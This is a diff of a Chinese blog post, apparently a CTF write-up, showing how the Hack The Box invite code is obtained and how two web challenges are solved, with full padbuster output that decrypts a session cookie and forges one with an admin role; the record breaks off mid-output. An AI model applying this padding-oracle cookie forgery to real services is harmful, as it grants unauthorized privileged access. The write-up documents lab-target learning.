@@ -1,13 +1,124 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>hack the box邀请码获取和web challenge · damn1t</title><meta name="description" content="hack the box邀请码获取和web challengehack the box邀请码获取在invite code页面输入，makeInvitecode，显示：1ƒ makeInviteCode()&amp;#123;$.ajax(&amp;#123;type:&amp;quot;POST&amp;quot;,dataTyp"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>hack the box邀请码获取和web challenge</a></h3></div><div class="post-content"><h1 id="hack-the-box邀请码获取和web-challenge"><a href="#hack-the-box邀请码获取和web-challenge" class="headerlink" title="hack the box邀请码获取和web challenge"></a>hack the box邀请码获取和web challenge</h1><h2 id="hack-the-box邀请码获取"><a href="#hack-the-box邀请码获取" class="headerlink" title="hack the box邀请码获取"></a>hack the box邀请码获取</h2><p>在invite code页面输入，<code>makeInvitecode</code>，显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ƒ makeInviteCode()&#123;$.ajax(&#123;type:&quot;POST&quot;,dataType:&quot;json&quot;,url:&apos;/api/invite/how/to/generate&apos;,success:function(response)&#123;console.log(response)&#125;,error:function(response)&#123;console.log(response)&#125;&#125;)&#125;</span><br></pre></td></tr></table></figure></p>
-<p>于是输入<code>makeInviteCode()</code>，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;0: 200, success: 1, data: &#123;…&#125;&#125;</span><br><span class="line">0: 200</span><br><span class="line">data:</span><br><span class="line">data: &quot;&lt;mysecret&gt;&quot;</span><br><span class="line">enctype: &quot;BASE64&quot;</span><br><span class="line">__proto__: Object</span><br><span class="line">success: 1</span><br><span class="line">__proto__: Object</span><br></pre></td></tr></table></figure></p>
-<p>base64解码：</p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>hack the box邀请码获取和web challenge · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">hack the box邀请码获取和web challenge</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-05-03</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="tutorial ctf"> tutorial ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="hack-the-box邀请码获取和web-challenge"><a href="#hack-the-box邀请码获取和web-challenge" class="headerlink" title="hack the box邀请码获取和web challenge"></a>hack the box邀请码获取和web challenge</h1><h2 id="hack-the-box邀请码获取"><a href="#hack-the-box邀请码获取" class="headerlink" title="hack the box邀请码获取"></a>hack the box邀请码获取</h2><p>在invite code页面输入，<code>makeInvitecode</code>，显示：</p>
+<pre><code>ƒ makeInviteCode(){$.ajax({type:&quot;POST&quot;,dataType:&quot;json&quot;,url:&#39;/api/invite/how/to/generate&#39;,success:function(response){console.log(response)},error:function(response){console.log(response)}})}
+</code></pre><p>于是输入<code>makeInviteCode()</code>，得到：</p>
+<pre><code>{0: 200, success: 1, data: {…}}
+0: 200
+data:
+data: &quot;&lt;mysecret&gt;&quot;
+enctype: &quot;BASE64&quot;
+__proto__: Object
+success: 1
+__proto__: Object
+</code></pre><p>base64解码：</p>
 <blockquote>
 <p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
 </blockquote>
-<p>利用curl协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v https://www.hackthebox.eu/api/invite/generate -XPOST</span><br></pre></td></tr></table></figure></p>
-<p>成功得到，然后将其base64解码</p>
-<h2 id="web-challenge"><a href="#web-challenge" class="headerlink" title="web challenge"></a>web challenge</h2><h3 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h3><p>我傻了，看请求，爆目录，都无果，最后注意到引用的jquery-3.2.1似乎有问题，利用<a href="http://www.matools.com/compare" target="_blank" rel="noopener">代码比对</a>，发现多了一块，再多出的这块代码开头发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);	form.setAttribute(&quot;method&quot;,&quot;post&quot;);	form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);	form.setAttribute(&quot;target&quot;,&quot;view&quot;);	var hiddenField=document.createElement(&quot;input&quot;);	hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);	hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);	var hiddenField2=document.createElement(&quot;input&quot;);	hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);	hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);	form.appendChild(hiddenField2);		form.appendChild(hiddenField);	form.appendChild(hiddenField2);	document.body.appendChild(form);			window.open(&apos;&apos;,&apos;view&apos;);	form.submit();&#125;</span><br></pre></td></tr></table></figure></p>
-<p>有两个值：<code>TXlMaXR0bGU</code>，<code>cDB3bmll</code>，成功登入<br>界面如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190644-17ffa23a-bbfc-1.png" alt=""><br>在mailbox发现了一个检索框但无法点击，检查元素，发现了图片地址<strong>./_secret<em>area</em>/mails.gif</strong>，于是尝试进入<strong>_secret<em>area</em></strong>目录，找到了邮箱：</p>
+<p>利用curl协议：</p>
+<pre><code>curl -v https://www.hackthebox.eu/api/invite/generate -XPOST
+</code></pre><p>成功得到，然后将其base64解码</p>
+<h2 id="web-challenge"><a href="#web-challenge" class="headerlink" title="web challenge"></a>web challenge</h2><h3 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h3><p>我傻了，看请求，爆目录，都无果，最后注意到引用的jquery-3.2.1似乎有问题，利用<a href="http://www.matools.com/compare" target="_blank" rel="noopener">代码比对</a>，发现多了一块，再多出的这块代码开头发现：</p>
+<pre><code>function doProcess() 
+{var form=document.createElement(&quot;form&quot;);    form.setAttribute(&quot;method&quot;,&quot;post&quot;);    form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);    form.setAttribute(&quot;target&quot;,&quot;view&quot;);    var hiddenField=document.createElement(&quot;input&quot;);    hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);    hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);    hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);    var hiddenField2=document.createElement(&quot;input&quot;);    hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);    hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);    hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);    form.appendChild(hiddenField2);        form.appendChild(hiddenField);    form.appendChild(hiddenField2);    document.body.appendChild(form);            window.open(&#39;&#39;,&#39;view&#39;);    form.submit();}
+</code></pre><p>有两个值：<code>TXlMaXR0bGU</code>，<code>cDB3bmll</code>，成功登入<br>界面如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190644-17ffa23a-bbfc-1.png" alt=""><br>在mailbox发现了一个检索框但无法点击，检查元素，发现了图片地址<strong>./_secret<em>area</em>/mails.gif</strong>，于是尝试进入<strong>_secret<em>area</em></strong>目录，找到了邮箱：</p>
 <blockquote>
 <h2 id="All-good-boys-are-here…-hehehehehehe"><a href="#All-good-boys-are-here…-hehehehehehe" class="headerlink" title="All good boys are here… hehehehehehe!"></a>All good boys are here… hehehehehehe!</h2><p>Peter Punk CallMePink@newmail.com<br>Nabuchodonosor BabyNavou@mailpost.gr<br>Ilias Magkakos imagkakos@badmail.com<br>Nick Pipshow NickTheGreek@mail.tr.gr<br>Don Quixote Windmill@mail.gr<br>Crazy Priest SeVaftise@hotmail.com<br>Fishroe Salad fishroesalad@mail.com<br>TaPanta Ola OlaMaziLeme@mail.gr<br>Laertis George I8aki@mail.gr<br>Thiseas Sparrow Pirates@mail.gr<br>Black Dreamer SupaHacka@mail.com<br>Callme Daddy FuckthemALL@mail.com<br>Aggeliki Lykolouli FwsStoTounel@Traino.pourxetai<br>Kompinadoros Yannnnis YannisWith4N@rolf.com<br>Serafino Titamola Ombrax@mail.gr<br>Joe Hard Soft@Butter.gr<br>Bond James MyNameIsBond@JamesBond.com<br>Endof Text EndOfLine@mail.com</p>
 </blockquote>
@@ -24,13 +135,240 @@
 <blockquote>
 <p>iknowmag1k:82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D</p>
 </blockquote>
-<p>查询一番，发现是<a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="noopener">padding Oracle</a><br>，准备在另一篇文章详解<br>可以利用padbuster，在kali上自带，可能是网络的原因，也可能是垃圾电脑的原因，跑了很久：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot;</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N/A</span><br><span class="line">[+] Content Length: 3844</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 4 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1	1	200	3844	N/A</span><br><span class="line">2 **	255	500	2203	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (63/256) [Byte 8]</span><br><span class="line">[+] Success: (150/256) [Byte 7]</span><br><span class="line">[+] Success: (129/256) [Byte 6]</span><br><span class="line">ERROR: No matching response on [Byte 5]</span><br><span class="line">       Automatically trying one more time...</span><br><span class="line">[+] Success: (223/256) [Byte 8]</span><br><span class="line">[+] Success: (10/256) [Byte 7]</span><br><span class="line">ERROR: No matching response on [Byte 6]</span><br><span class="line">Do you want to start this block over? (Yes/No)? [y/n/a] : y</span><br><span class="line">INFO: Switching to interactive mode</span><br><span class="line">[+] Success: (63/256) [Byte 8]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : y</span><br><span class="line">[+] Success: (150/256) [Byte 7]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : a</span><br><span class="line">[+] Success: (225/256) [Byte 6]</span><br><span class="line">[+] Success: (154/256) [Byte 5]</span><br><span class="line">[+] Success: (57/256) [Byte 4]</span><br><span class="line">[+] Success: (140/256) [Byte 3]</span><br><span class="line">[+] Success: (185/256) [Byte 2]</span><br><span class="line">[+] Success: (128/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 5ff96bda9a25d7f9</span><br><span class="line">[+] Intermediate Bytes (HEX): 884072c2621c68c0</span><br><span class="line">[+] Plain Text: &#123;&quot;user&quot;:</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 4.</span><br><span class="line">*** Starting Block 2 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (44/256) [Byte 8]</span><br><span class="line">[+] Success: (9/256) [Byte 7]</span><br><span class="line">[+] Success: (184/256) [Byte 6]</span><br><span class="line">[+] Success: (9/256) [Byte 5]</span><br><span class="line">[+] Success: (78/256) [Byte 4]</span><br><span class="line">[+] Success: (247/256) [Byte 3]</span><br><span class="line">[+] Success: (97/256) [Byte 2]</span><br><span class="line">[+] Success: (139/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 054ef73b3398cc72</span><br><span class="line">[+] Intermediate Bytes (HEX): 7d980fb7f34bf5d5</span><br><span class="line">[+] Plain Text: &quot;admin&quot;,</span><br><span class="line"></span><br><span class="line">*** Starting Block 3 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (175/256) [Byte 8]</span><br><span class="line">[+] Success: (12/256) [Byte 7]</span><br><span class="line">[+] Success: (71/256) [Byte 6]</span><br><span class="line">[+] Success: (174/256) [Byte 5]</span><br><span class="line">[+] Success: (174/256) [Byte 4]</span><br><span class="line">[+] Success: (98/256) [Byte 3]</span><br><span class="line">[+] Success: (197/256) [Byte 2]</span><br><span class="line">[+] Success: (209/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 3 Results:</span><br><span class="line">[+] Cipher Text (HEX): 97a1379951adf98c</span><br><span class="line">[+] Intermediate Bytes (HEX): 273c985756baf650</span><br><span class="line">[+] Plain Text: &quot;role&quot;:&quot;</span><br><span class="line"></span><br><span class="line">*** Starting Block 4 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (113/256) [Byte 8]</span><br><span class="line">[+] Success: (7/256) [Byte 7]</span><br><span class="line">[+] Success: (45/256) [Byte 6]</span><br><span class="line">[+] Success: (137/256) [Byte 5]</span><br><span class="line">[+] Success: (18/256) [Byte 4]</span><br><span class="line">[+] Success: (172/256) [Byte 3]</span><br><span class="line">[+] Success: (43/256) [Byte 2]</span><br><span class="line">[+] Success: (22/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 4 Results:</span><br><span class="line">[+] Cipher Text (HEX): 41d12ce36fc3308e</span><br><span class="line">[+] Intermediate Bytes (HEX): e2d252eb73d0fb8e</span><br><span class="line">[+] Plain Text: user&quot;&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): &#123;&quot;user&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;user&quot;&#125;</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 7B2275736572223A2261646D696E222C22726F6C65223A2275736572227D0202</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
-<p>所以将<strong>role</strong>改为<strong>admin</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot; -plaintext &quot;&#123;\&quot;user\&quot;:\&quot;admin\&quot;,\&quot;role\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N/A</span><br><span class="line">[+] Content Length: 3844</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 4</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1	1	200	3844	N/A</span><br><span class="line">2 **	255	500	2203	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (97/256) [Byte 8]</span><br><span class="line">[+] Success: (155/256) [Byte 7]</span><br><span class="line">[+] Success: (87/256) [Byte 6]</span><br><span class="line">[+] Success: (153/256) [Byte 5]</span><br><span class="line">[+] Success: (61/256) [Byte 4]</span><br><span class="line">[+] Success: (188/256) [Byte 3]</span><br><span class="line">[+] Success: (151/256) [Byte 2]</span><br><span class="line">[+] Success: (167/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 4 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 300a2faf0d881a9f</span><br><span class="line">[+] Intermediate Bytes (HEX): 516e42c663aa679e</span><br><span class="line"></span><br><span class="line">[+] Success: (197/256) [Byte 8]</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">[+] Success: (51/256) [Byte 6]</span><br><span class="line">[+] Success: (253/256) [Byte 5]</span><br><span class="line">[+] Success: (25/256) [Byte 4]</span><br><span class="line">[+] Success: (182/256) [Byte 3]</span><br><span class="line">[+] Success: (226/256) [Byte 2]</span><br><span class="line">[+] Success: 